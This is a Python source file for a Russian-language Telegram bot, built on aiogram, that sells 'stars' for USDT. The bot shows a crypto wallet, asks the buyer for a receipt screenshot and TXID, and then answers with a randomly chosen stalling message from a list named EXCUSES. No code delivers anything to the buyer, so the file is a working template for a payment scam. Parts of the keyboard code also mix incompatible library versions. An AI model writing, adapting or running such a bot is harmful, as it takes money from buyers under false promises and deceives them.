import asyncio
import random
import os
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command

TOKEN = os.getenv("BOT_TOKEN")
if not TOKEN:
    print("ОШИБКА: BOT_TOKEN не найден")
    exit(1)

bot = Bot(token=TOKEN)
dp = Dispatcher()

WALLETS = ["TXu5abcdef1234567890"]
EXCUSES = [
    "✅ Платёж получен! Звёзды будут начислены в течение 48 часов.",
    "🔄 Технические работы. Задержка до 72 часов."
]

main_kb = ReplyKeyboardMarkup(resize_keyboard=True)
main_kb.add(KeyboardButton("🌟 Купить звёзды"), KeyboardButton("🆔 Мой ID"))

@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer(f"🌟 Добро пожаловать!\nВаш ID: `{message.from_user.id}`", parse_mode="Markdown", reply_markup=main_kb)

@dp.message(lambda message: message.text == "🆔 Мой ID")
async def show_id(message: types.Message):
    bot_id = (await bot.get_me()).id
    await message.answer(f"🆔 Ваш ID: `{message.from_user.id}`\n🤖 ID бота: `{bot_id}`", parse_mode="Markdown")

@dp.message(lambda message: message.text == "🌟 Купить звёзды")
async def buy(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="100 ⭐ - 5 USDT", callback_data="buy")]
    ])
    await message.answer("Выберите количество:", reply_markup=kb)

@dp.callback_query(lambda c: c.data == "buy")
async def process_buy(callback: types.CallbackQuery):
    wallet = random.choice(WALLETS)
    await callback.message.edit_text(f"💰 Оплатите на кошелёк:\n`{wallet}`\n\nПришлите скрин чека и TXID.\n\n🆔 Ваш ID: `{callback.from_user.id}`", parse_mode="Markdown")

@dp.message(lambda message: message.photo)
async def handle_photo(message: types.Message):
    excuse = random.choice(EXCUSES)
    await message.answer(f"{excuse}\n\n🆔 Ваш ID: `{message.from_user.id}`", parse_mode="Markdown")

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
